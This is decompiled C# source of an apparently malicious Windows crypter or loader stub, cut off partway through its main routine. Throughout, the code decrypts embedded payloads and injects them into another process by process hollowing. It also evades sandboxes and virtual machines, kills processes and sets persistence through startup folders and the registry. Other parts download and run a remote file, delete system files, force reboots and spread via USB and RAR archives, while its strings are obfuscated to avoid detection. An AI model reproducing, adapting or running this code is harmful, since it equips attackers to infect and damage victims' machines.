using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

public class Class1
{
	public class vr30
	{
		private delegate bool vr21(string vr20, string vr18, IntPtr vr17, IntPtr vr16, bool vr15, int vr14, IntPtr vr13, string vr12, byte[] vr11, IntPtr[] vr10);

		private delegate bool vr22(IntPtr vr20, uint[] vr18);

		private delegate uint vr23(IntPtr vr20, IntPtr vr18);

		private delegate bool vr24(IntPtr vr20, IntPtr vr18, ref IntPtr vr17, IntPtr vr16, ref IntPtr vr15);

		private delegate int vr25(IntPtr vr20);

		private delegate IntPtr vr26(IntPtr vr20, IntPtr vr18, IntPtr vr17, int vr16, int vr15);

		private delegate bool vr28(IntPtr vr20, IntPtr vr18, byte[] vr17, IntPtr vr16, ref IntPtr vr15);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

		private static T vr0<T>(string vr20, string vr18)
		{
			return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref vr20), ref vr18), typeof(T));
		}

		public static void vr31(byte[] vr20)
		{
			string p = string.Empty;
			string[] directories = Directory.GetDirectories(Conversions.ToString(Environment.SystemDirectory[0]) + xEncryption("Ss9aOMHbSt9", "49653626232C0D2407651E1A5A13203E2704275A77162765273D2C2507241B4B38"));
			foreach (string text in directories)
			{
				if (text.Contains(xEncryption("SswtvoKRqJJ", "05455A4641")))
				{
					p = text + xEncryption("S06pYVzNEEi", "6C40123A781F3620");
					break;
				}
			}
			vr31(vr20, p);
		}

		public static void vr31(byte[] vr20, string P)
		{
			if (vr20[60] == 128)
			{
				Thread thread = new Thread(vr0);
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start(vr20);
				return;
			}
			int[] array = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
			int num = BitConverter.ToInt32(vr20, 60);
			checked
			{
				int num2 = BitConverter.ToInt16(vr20, num + 6);
				IntPtr vr21 = new IntPtr(BitConverter.ToInt32(vr20, num + 84));
				byte[] vr22 = new byte[68];
				IntPtr[] array2 = new IntPtr[4];
				IntPtr intPtr = default(IntPtr);
				if (!vr0<vr21>(xEncryption("S9lKQgOTWAf", "5209393F02236765"), xEncryption("SEJdzhjt0Lr", "0638011B1C0F2442231136363925"))(null, P, intPtr, intPtr, vr15: false, 4, intPtr, null, vr22, array2))
				{
					return;
				}
				uint[] array3 = new uint[179];
				array3[0] = 65538u;
				if (vr0<vr22>(xEncryption("S9lKQgOTWAf", "5209393F02236765"), xEncryption("SzDdCB7qkFv", "3D2110172A45140A22353C1430013B36"))(array2[1], array3))
				{
					vr24 vr23 = vr0<vr24>(xEncryption("S9lKQgOTWAf", "5209393F02236765"), xEncryption("SFyqeNwH3AK", "141C10011E0527502438200B1C1C0A3C0E"));
					IntPtr vr24 = array2[0];
					IntPtr vr25 = new IntPtr(unchecked((long)array3[41]) + 8L);
					IntPtr vr26 = new IntPtr(4);
					IntPtr vr27 = default(IntPtr);
					IntPtr vr28 = default(IntPtr);
					if (vr23(vr24, vr25, ref vr27, vr26, ref vr28) && unchecked((long)vr0<vr23>(xEncryption("SXSpW29qC56", "3627143B5E"), xEncryption("SxdgjiVqicQ", "361032040437013F0A34243702340F0A2218060D"))(array2[0], vr27)) == 0L)
					{
						vr26 vr29 = vr0<vr26>(xEncryption("S9lKQgOTWAf", "5209393F02236765"), xEncryption("S1GX9GeMurQ", "672E2A4D320421341E3D3C520220"));
						IntPtr vr30 = array2[0];
						IntPtr intPtr2 = new IntPtr(BitConverter.ToInt32(vr20, num + 52));
						IntPtr vr31 = intPtr2;
						IntPtr vr32 = new IntPtr(BitConverter.ToInt32(vr20, num + 80));
						IntPtr vr33 = vr29(vr30, vr31, vr32, 12288, 64);
						vr28 vr34 = vr0<vr28>(xEncryption("S9lKQgOTWAf", "5209393F02236765"), xEncryption("Syxm3jyLITh", "2E0A04470F293E26370D200A35085E050B35"));
						vr34(array2[0], vr33, vr20, vr21, ref vr28);
						int num3 = num2 - 1;
						for (int i = 0; i <= num3; i++)
						{
							int[] array4 = new int[10];
							Buffer.BlockCopy(vr20, num + 248 + i * 40, array4, 0, 40);
							byte[] array5 = new byte[array4[4] - 1 + 1];
							IntPtr vr35 = new IntPtr(vr33.ToInt32() + array4[3]);
							int num4 = array5.Length;
							IntPtr vr36 = new IntPtr(num4);
							Buffer.BlockCopy(vr20, array4[5], array5, 0, num4);
							vr34(array2[0], vr35, array5, vr36, ref vr28);
						}
						IntPtr vr37 = array2[0];
						vr32 = new IntPtr(unchecked((long)array3[41]) + 8L);
						IntPtr vr38 = vr32;
						byte[] bytes = BitConverter.GetBytes(vr33.ToInt32());
						intPtr2 = new IntPtr(4);
						vr34(vr37, vr38, bytes, intPtr2, ref vr28);
						array3[44] = (uint)(vr33.ToInt32() + BitConverter.ToInt32(vr20, num + 40));
						vr0<vr22>(xEncryption("S9lKQgOTWAf", "5209393F02236765"), xEncryption("SuaW6so8lzw", "260423621B1D5D0D1E343C1B15324E07"))(array2[1], array3);
					}
				}
				vr0<vr25>(xEncryption("S9lKQgOTWAf", "5209393F02236765"), xEncryption("Su9JGi4bXSp", "275C39320451363021153211"))(array2[1]);
			}
		}

		private static void vr0(object vr0)
		{
			MethodInfo entryPoint = Assembly.Load((byte[])vr0).EntryPoint;
			if (entryPoint.GetParameters().Length == 1)
			{
				entryPoint.Invoke(null, new object[1] { new string[0] });
			}
			else
			{
				entryPoint.Invoke(null, null);
			}
		}
	}

	public class StairsEncryption
	{
		public static string DeCrypt(string Data, string key)
		{
			return Encoding.Default.GetString(DeCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(key)));
		}

		public static byte[] DeCrypt(byte[] Data, byte[] key)
		{
			checked
			{
				object obj = default(object);
				object obj2 = default(object);
				if (ForLoopControl.ForLoopInitObj(obj, (object)(Data.Length - 1), (object)0, (object)(-1), ref obj2, ref obj))
				{
					do
					{
						Data[Conversions.ToInteger(obj)] = (byte)unchecked(checked((Data[Conversions.ToInteger(obj)] ^ key[Conversions.ToInteger(Operators.ModObject(obj, (object)key.Length))]) - unchecked((int)Data[Conversions.ToInteger(Operators.ModObject(Operators.AddObject(obj, (object)1), (object)Data.Length))]) + 256) % 256);
					}
					while (ForLoopControl.ForNextCheckObj(obj, obj2, ref obj));
				}
				return Data;
			}
		}
	}

	[AccessedThroughProperty("a1")]
	private static ManagementEventWatcher _a1;

	public static string a2;

	private string Targetdrive;

	private static string Re1;

	private static string Re2;

	private static ManagementEventWatcher a1
	{
		get
		{
			return _a1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Expected O, but got Unknown
			//IL_0036: Unknown result type (might be due to invalid IL or missing references)
			//IL_0040: Expected O, but got Unknown
			if (_a1 != null)
			{
				_a1.remove_EventArrived(new EventArrivedEventHandler(Arrived));
			}
			_a1 = value;
			if (_a1 != null)
			{
				_a1.add_EventArrived(new EventArrivedEventHandler(Arrived));
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		ResourceManager resourceManager = new ResourceManager("N", Assembly.GetExecutingAssembly());
		string text = Conversions.ToString(resourceManager.GetObject("EO"));
		string[] array = Strings.Split(text, "SRHJrsWaVYR", -1, (CompareMethod)0);
		string text2 = xEncryption("Scz2Xx83d7w", "3708473D");
		if (Operators.CompareString(array[79], text2, false) == 0)
		{
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());
			if (Process.GetProcessesByName(fileNameWithoutExtension).Length > 1)
			{
				ProjectData.EndApp();
			}
			else if (Process.GetProcessesByName(xEncryption("SZZK05oR9pH", "2C3828")).Length >= 1)
			{
				ProjectData.EndApp();
			}
		}
		checked
		{
			if (Operators.CompareString(array[85], text2, false) == 0)
			{
				if (Operators.CompareString(array[65], text2, false) == 0)
				{
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					string text3 = folderPath + xEncryption("Sg0PaJggXrc", "3B793E123E060B345C0F3C00");
					string text4 = folderPath + "\\" + Path.GetFileName(Application.get_ExecutablePath());
					if (!Directory.Exists(folderPath))
					{
						Directory.CreateDirectory(folderPath);
					}
					if (Operators.CompareString(Application.get_ExecutablePath(), text4, false) != 0)
					{
						FileSystem.FileOpen(10, text3, (OpenMode)32, (OpenAccess)2, (OpenShare)(-1), -1);
						FileSystem.FilePut(10, Application.get_ExecutablePath(), -1L, false);
						FileSystem.FileClose(new int[1] { 10 });
						FileSystem.FileOpen(20, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)(-1), -1);
						string text5 = Strings.Space((int)FileSystem.LOF(20));
						FileSystem.FileGet(20, ref text5, -1L, false);
						FileSystem.FileClose(new int[1] { 20 });
						FileSystem.FileOpen(30, text4, (OpenMode)32, (OpenAccess)2, (OpenShare)(-1), -1);
						FileSystem.FilePut(30, text5, -1L, false);
						FileSystem.FileClose(new int[1] { 30 });
						Process.Start(text4);
						Environment.Exit(0);
					}
					else if (File.Exists(text3))
					{
						object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(text3);
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text3);
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
					}
				}
				if (Operators.CompareString(array[64], text2, false) == 0)
				{
					try
					{
						string text6 = xEncryption("Ssxs79yrjkO", "3B33366E663A2738390A1D272726647C2B2E390429270419015265341B091920201C1E076B6E101C0E0438202F3B06454B1C1C1E4B1936010B1A58572522050726301A1D006B7C010206043D3601");
						((ServerComputer)MyProject.Computer).get_Registry().SetValue(text6, xEncryption("SzzSuNmlKfC", "3415151A2209093929332713153D06"), (object)"1", RegistryValueKind.DWord);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				if (Operators.CompareString(array[66], text2, false) == 0)
				{
				}
				if (Operators.CompareString(array[67], text2, false) == 0)
				{
					string text7 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\1" + Path.GetFileName(Application.get_ExecutablePath());
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[70], text7);
					while (!File.Exists(text7))
					{
						Thread.Sleep(1000);
					}
					Process.Start(text7);
				}
				if (Operators.CompareString(array[69], text2, false) == 0)
				{
					try
					{
						File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.System) + xEncryption("S5qWxr6NMAg", "691936145C522221"));
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			if (Operators.CompareString(array[68], text2, false) == 0)
			{
				string text8 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + xEncryption("S5ZWWDTJktD", "692832243035381F");
				if (!File.Exists(text8))
				{
					byte[] array2 = new byte[0];
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text8, array2, true);
					Interaction.Shell("shutdown -r -t 00", (AppWinStyle)0, false, -1);
				}
			}
			NewLateBinding.LateCall((object)null, typeof(Thread), "Sleep", new object[1] { Operators.MultiplyObject(resourceManager.GetObject("DE"), (object)1000) }, (string[])null, (Type[])null, (bool[])null, true);
			if (Operators.CompareString(array[82], text2, false) == 0)
			{
				string text9 = xEncryption("SIR5ZbH5AQF", "7E64016255650672666B6B7D600C63577D18736370627D");
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(xEncryption("SFCvzqdp9dy", "150C302E2625227C38343A253119091E02046533103D222C0109512A2465270C213426180E2701024A0D163D"), writable: false);
				object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(xEncryption("SwEjDpMHj7O", "27370520052E3C2353")));
				string text10 = null;
				string text11 = xEncryption("SlQCwjR6GfU", "3F140F322906166D461301231C6320033C057539033A08342C34053C423509393F0923");
				object @object = Interaction.GetObject(xEncryption("SyCEmufKk6g", "0E2A2B00120B3F180C"), (string)null);
				object[] array3 = new object[1] { text11 };
				object[] array4 = array3;
				bool[] array5 = new bool[1] { true };
				object obj2 = NewLateBinding.LateGet(@object, (Type)null, "ExecQuery", array4, (string[])null, (Type[])null, array5);
				if (array5[0])
				{
					text11 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3[0]), typeof(string));
				}
				object objectValue2 = RuntimeHelpers.GetObjectValue(obj2);
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = ((IEnumerable)objectValue2).GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue3 = RuntimeHelpers.GetObjectValue(enumerator.Current);
						text10 = Conversions.ToString(NewLateBinding.LateGet(objectValue3, (Type)null, "Description", new object[0], (string[])null, (Type[])null, (bool[])null));
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				if (Operators.CompareString(array[7], text2, false) == 0 && Operators.CompareString(Application.get_ExecutablePath(), Application.get_StartupPath() + xEncryption("SBq3UqPpfbu", "1E225238013C1548070D36"), false) == 0)
				{
					Thread.Sleep(10000);
				}
				if (Operators.CompareString(array[8], text2, false) == 0 && Operators.ConditionalCompareObjectEqual(objectValue, (object)text9, false))
				{
					Thread.Sleep(10000);
				}
				if (Operators.CompareString(array[9], text2, false) == 0)
				{
					A(xEncryption("SWsoDpvcDm2", "201A1D21031E023606"));
				}
				if (Operators.CompareString(array[10], text2, false) == 0)
				{
					string text12 = text10;
					if (Operators.CompareString(text12, xEncryption("SKU6uHfNz8h", "1D1816342C02270E51073D3875654668323C13575B61646302"), false) == 0)
					{
						Thread.Sleep(10000);
					}
				}
				if (Operators.CompareString(array[11], text2, false) == 0)
				{
					string text13 = text10;
					if (Operators.CompareString(text13, xEncryption("S6MvjDn0ibv", "6024041E310F5C2B0D0E73713F171A2C07531A423737573D020F36"), false) == 0)
					{
						Thread.Sleep(10000);
					}
				}
				if (Operators.CompareString(array[12], text2, false) == 0)
				{
					A(xEncryption("SH6Hz1ZPS0v", "1B54211F622C33"));
				}
				if (Operators.CompareString(array[18], text2, false) == 0)
				{
					A(xEncryption("SEzRlAHYHAF", "240C22"));
				}
				if (Operators.CompareString(array[20], text2, false) == 0)
				{
					string text14 = text10;
					if (Operators.CompareString(text14, xEncryption("SoMEQ3wssjG", "39003230411253203C00124F040C"), false) == 0)
					{
						Thread.Sleep(10000);
					}
				}
				if (Operators.CompareString(array[28], text2, false) == 0)
				{
					A(xEncryption("Sd40qHvnmiL", "0542571F3C"));
				}
				if (Operators.CompareString(array[29], text2, false) == 0)
				{
					A(xEncryption("SnKw3DlQUMW", "0F381F60211E27"));
				}
				if (Operators.CompareString(array[30], text2, false) == 0)
				{
					A(xEncryption("SkYm8edXxCh", "0A2F0A4C170521"));
				}
			}
			if ((Operators.CompareString(array[82], text2, false) == 0) | (Operators.CompareString(array[85], text2, false) == 0))
			{
				if (Operators.CompareString(array[13], text2, false) == 0)
				{
					Thread thread = new Thread(F13);
					thread.Start();
				}
				if (Operators.CompareString(array[14], text2, false) == 0)
				{
					Thread thread2 = new Thread(F14);
					thread2.Start();
				}
				if (Operators.CompareString(array[15], text2, false) == 0)
				{
					Thread thread3 = new Thread(F15);
					thread3.Start();
				}
				if (Operators.CompareString(array[16], text2, false) == 0)
				{
					Thread thread4 = new Thread(F16);
					thread4.Start();
				}
				if (Operators.CompareString(array[17], text2, false) == 0)
				{
					Thread thread5 = new Thread(F17);
					thread5.Start();
				}
				if (Operators.CompareString(array[19], text2, false) == 0)
				{
					Thread thread6 = new Thread(F19);
					thread6.Start();
				}
				if (Operators.CompareString(array[21], text2, false) == 0)
				{
					Thread thread7 = new Thread(F21);
					thread7.Start();
				}
				if (Operators.CompareString(array[22], text2, false) == 0)
				{
					Thread thread8 = new Thread(F22);
					thread8.Start();
				}
				if (Operators.CompareString(array[23], text2, false) == 0)
				{
					Thread thread9 = new Thread(F23);
					thread9.Start();
				}
				if (Operators.CompareString(array[24], text2, false) == 0)
				{
					Thread thread10 = new Thread(F24);
					thread10.Start();
				}
				if (Operators.CompareString(array[25], text2, false) == 0)
				{
					Thread thread11 = new Thread(F25);
					thread11.Start();
				}
				if (Operators.CompareString(array[26], text2, false) == 0)
				{
					Thread thread12 = new Thread(F26);
					thread12.Start();
				}
				if (Operators.CompareString(array[27], text2, false) == 0)
				{
					Thread thread13 = new Thread(F27);
					thread13.Start();
				}
				if (Operators.CompareString(array[59], text2, false) == 0)
				{
					Thread thread14 = new Thread(F59);
					thread14.Start();
				}
				if (Operators.CompareString(array[60], text2, false) == 0)
				{
					Thread thread15 = new Thread(F60);
					thread15.Start();
				}
				if (Operators.CompareString(array[61], text2, false) == 0)
				{
					Thread thread16 = new Thread(F61);
					thread16.Start();
				}
				if (Operators.CompareString(array[62], text2, false) == 0)
				{
					Thread thread17 = new Thread(F62);
					thread17.Start();
				}
				if (Operators.CompareString(array[63], text2, false) == 0)
				{
					Thread thread18 = new Thread(F63);
					thread18.Start();
				}
			}
			if (Operators.CompareString(array[84], text2, false) == 0)
			{
				vr30.vr31(Rc4((byte[])resourceManager.GetObject("WD"), (byte[])resourceManager.GetObject("K")));
			}
			((ServerComputer)MyProject.Computer).get_Info().get_OSFullName();
			string text15 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Path.GetFileNameWithoutExtension(Application.get_ExecutablePath()) + xEncryption("SGVdKDsMOqr", "6978013321");
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + xEncryption("Sy4UfNSaAyr", "591C2D5E787A")))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text15, Rc4((byte[])resourceManager.GetObject("INJ"), (byte[])resourceManager.GetObject("K")), false);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(array[0], text2, false) == 0)
			{
				if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + xEncryption("Sy4UfNSaAyr", "591C2D5E787A")))
				{
					vr30.vr31(Rc4((byte[])resourceManager.GetObject("F"), (byte[])resourceManager.GetObject("K")));
				}
				else
				{
					vr30.vr31(Rc4((byte[])resourceManager.GetObject("F"), (byte[])resourceManager.GetObject("K")), text15);
				}
			}
			else if (Operators.CompareString(array[1], text2, false) == 0)
			{
				string s = xEncryption(Conversions.ToString(resourceManager.GetObject("KK")), Conversions.ToString(resourceManager.GetObject("F")));
				byte[] bytes = Encoding.Default.GetBytes(s);
				if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + xEncryption("Sy4UfNSaAyr", "591C2D5E787A")))
				{
					vr30.vr31(bytes);
				}
				else
				{
					vr30.vr31(bytes, text15);
				}
			}
			else if (Operators.CompareString(array[2], text2, false) != 0)
			{
				if (Operators.CompareString(array[3], text2, false) == 0)
				{
					string s2 = TripleDES(Conversions.ToString(resourceManager.GetObject("F")), Conversions.ToString(resourceManager.GetObject("KK")), d: true);
					byte[] bytes2 = Encoding.Default.GetBytes(s2);
					if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + xEncryption("Sy4UfNSaAyr", "591C2D5E787A")))
					{
						vr30.vr31(bytes2);
					}
					else
					{
						vr30.vr31(bytes2, text15);
					}
				}
				else if (Operators.CompareString(array[4], text2, false) == 0)
				{
					string s3 = Conversions.ToString(Rijndael(Conversions.ToString(resourceManager.GetObject("F")), Conversions.ToString(resourceManager.GetObject("KK"))));
					byte[] bytes3 = Encoding.Default.GetBytes(s3);
					if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + xEncryption("Sy4UfNSaAyr", "591C2D5E787A")))
					{
						vr30.vr31(bytes3);
					}
					else
					{
						vr30.vr31(bytes3, text15);
					}
				}
				else if (Operators.CompareString(array[5], text2, false) == 0)
				{
					if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + xEncryption("Sy4UfNSaAyr", "591C2D5E787A")))
					{
						vr30.vr31((byte[])NewLateBinding.LateGet((object)null, typeof(StairsEncryption), "DeCrypt", new object[2]
						{
							RuntimeHelpers.GetObjectValue(resourceManager.GetObject("F")),
							RuntimeHelpers.GetObjectValue(resourceManager.GetObject("K"))
						}, (string[])null, (Type[])null, (bool[])null));
					}
					else
					{
						vr30.vr31((byte[])NewLateBinding.LateGet((object)null, typeof(StairsEncryption), "DeCrypt", new object[2]
						{
							RuntimeHelpers.GetObjectValue(resourceManager.GetObject("F")),
							RuntimeHelpers.GetObjectValue(resourceManager.GetObject("K"))
						}, (string[])null, (Type[])null, (bool[])null), text15);
					}
				}
				else if (Operators.CompareString(array[6], text2, false) != 0)
				{
				}
			}
			try
			{
				if (Operators.CompareString(array[86], text2, false) == 0)
				{
					int i = 0;
					if (Operators.CompareString(array[71], text2, false) == 0)
					{
						for (; Operators.ConditionalCompareObjectNotEqual((object)i, resourceManager.GetObject("Ei"), false); i++)
						{
							Process.Start(xEncryption("S0XRzTrwA7h", "533536"));
						}
					}
					if (Operators.CompareString(array[72], text2, false) == 0)
					{
						for (i = 0; Operators.ConditionalCompareObjectNotEqual((object)i, resourceManager.GetObject("Ni"), false); i++)
						{
							Process.Start(xEncryption("SOvgleA8HE9", "2119130915205C"));
						}
					}
					if (Operators.CompareString(array[73], text2, false) == 0)
					{
						for (i = 0; Operators.ConditionalCompareObjectNotEqual((object)i, resourceManager.GetObject("Te"), false); i++)
						{
							try
							{
								Process.Start(array[78]);
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
						}
					}
					if (Operators.CompareString(array[74], text2, false) == 0)
					{
						for (i = 0; Operators.ConditionalCompareObjectNotEqual((object)i, resourceManager.GetObject("El"), false); i++)
						{
							Netframe();
						}
					}
					if (Operators.CompareString(array[75], text2, false) == 0)
					{
						for (i = 0; Operators.ConditionalCompareObjectNotEqual((object)i, resourceManager.GetObject("Tw"), false); i++)
						{
							string text16 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 5f));
							try
							{
								string text17 = text16;
								if (Operators.CompareString(text17, Conversions.ToString(0), false) == 0)
								{
									text16 = xEncryption("SnxyrFiG8I5", "190F0E5C3F063252204F29401B161F");
									Process.Start(text16);
								}
								else if (Operators.CompareString(text17, Conversions.ToString(1), false) == 0)
								{
									text16 = xEncryption("SOBQdUREjnu", "3835264A2127270F565B30202F");
									Process.Start(text16);
								}
								else if (Operators.CompareString(text17, Conversions.ToString(2), false) == 0)
								{
									text16 = xEncryption("SWdGUXu9XP5", "2013307B36144C3F38412A3609222731165876335A3E");
									Process.Start(text16);
								}
								else if (Operators.CompareString(text17, Conversions.ToString(3), false) == 0)
								{
									text16 = xEncryption("S3zh8XRybkk", "440D1F16303D0D000A093643151A4C393E57010406");
									Process.Start(text16);
								}
								else if (Operators.CompareString(text17, Conversions.ToString(4), false) == 0)
								{
									text16 = xEncryption("SFzgrN1El4x", "310D105C2C4324164E1D213554041D23");
									Process.Start(text16);
								}
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
						}
					}
					if (Operators.CompareString(array[76], text2, false) == 0)
					{
						string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + xEncryption("SuVnBo3Lxy2", "291B0138065F201959743A0733082D176F0A110B57351A2E40271756");
						try
						{
							File.Delete(path);
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
					}
					if (Operators.CompareString(array[77], text2, false) == 0)
					{
						try
						{
							Process[] processes = Process.GetProcesses();
							foreach (Process process in processes)
							{
								if (xEncryption("SK6Gu2qqlva", "2E4E37195D03141E").Contains(process.ProcessName))
								{
									process.Kill();
								}
							}
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
					}
				}
				if (Operators.CompareString(array[83], text2, false) == 0)
				{
					if (Operators.CompareString(array[53], text2, false) == 0)
					{
						USB();
					}
					if (Operators.CompareString(array[55], text2, false) == 0)
					{
						string text18 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue(xEncryption("SU1rRzYTBez", "1D7A370B25151B0124360C1870311A3317111E363515016633003F05182B081F043C43170E"), xEncryption("SvStXjK8p7h", "253B152A0F2F"), (object)0));
						text18.Replace("\\", "/");
						try
						{
							File.Copy(Application.get_ExecutablePath(), text18 + Path.GetFileName(Application.get_ExecutablePath()));
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							ProjectData.ClearProjectError();
						}
						try
						{
							File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\" + xEncryption("SvStXjK8p7h", "253B152A0F2F") + "\\" + Path.GetFileName(Application.get_ExecutablePath()));
						}
						catch (Exception projectError9)
						{
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
						}
					}
					if (Operators.CompareString(array[56], text2, false) == 0)
					{
						Rar.INF(Application.get_ExecutablePath());
					}
				}
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
			string text19 = null;
			if (Operators.CompareString(array[83], text2, false) == 0 && ((Operators.CompareString(array[47], text2, false) == 0) | (Operators.CompareString(array[48], text2, false) == 0)))
			{
				try
				{
					if (Operators.CompareString(array[49], text2, false) == 0)
					{
						text19 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					}
					if (Operators.CompareString(array[50], text2, false) == 0)
					{
						text19 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
					}
					if (Operators.CompareString(array[51], text2, false) == 0)
					{
						text19 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
					}
					if (Operators.CompareString(array[52], text2, false) == 0)
					{
						if (Directory.Exists(xEncryption("S0NL4Jp2eBV", "73741063231E560A3525")))
						{
							text19 = xEncryption("SpxyGqKne4g", "3342251408381A005947051F140C2A146B270B5208211D190D2E1E25");
						}
						else if (Directory.Exists(xEncryption("SO4o71BEVZx", "0B0E3360582C21392D0B")))
						{
							text19 = xEncryption("SmuzjMgmQFl", "294F2639341419342B4C0502190F072847243F20032100140E032209");
						}
					}
					AStartUp(Application.get_ExecutablePath(), text19);
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				string[] array6 = Strings.Split(Conversions.ToString(Rijndael(Conversions.ToString(resourceManager.GetObject("Ev")), Conversions.ToString(resourceManager.GetObject("KK")))), xEncryption("ShkcSHInDUU", "3B040E363C21072A321C3D2A0E17242D2C00"), -1, (CompareMethod)0);
				string text20 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Number(10000, 99999) + array6[1];
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text20, Encoding.Default.GetBytes(array6[0]), false);
				if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BSU"), (object)text2, false))
				{
					Process.Start(text20);
				}
				else if (Operators.CompareString(Application.get_ExecutablePath(), text19 + "\\" + Path.GetFileName(Application.get_ExecutablePath()), false) != 0)
				{
					Process.Start(text20);
				}
				array6 = Strings.Split(Conversions.ToString(Rijndael(Conversions.ToString(resourceManager.GetObject("Ev1")), Conversions.ToString(resourceManager.GetObject("KK")))), xEncryption("ShkcSHInDUU", "3B040E363C21072A321C3D2A0E17242D2C00"), -1, (CompareMethod)0);
				string text21 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Number(10000, 99999) + array6[1];
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text21, Encoding.Default.GetBytes(array6[0]), false);
				if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BSU"), (object)text2, false))
				{
					Process.Start(text20);
				}
				else if (Operators.CompareString(Application.get_ExecutablePath(), text19 + "\\" + Path.GetFileName(Application.get_ExecutablePath()), false) != 0)
				{
					Process.Start(text21);
				}
				array6 = Strings.Split(Conversions.ToString(Rijndael(Conversions.ToString(resourceManager.GetObject("Ev2")), Conversions.ToString(resourceManager.GetObject("KK")))), xEncryption("ShkcSHInDUU", "3B040E363C21072A321C3D2A0E17242D2C00"), -1, (CompareMethod)0);
				string text22 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Number(10000, 99999) + array6[1];
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text22, Encoding.Default.GetBytes(array6[0]), false);
				if (Operators.ConditionalCompareObjectEqual(resourceManager.GetObject("BSU"), (object)text2, false))
				{
					Process.Start(text20);
				}
				else if (Operators.CompareString(Application.get_ExecutablePath(), text19 + "\\" + Path.GetFileName(Application.get_ExecutablePath()), false) != 0)
				{
					Process.Start(text22);
				}
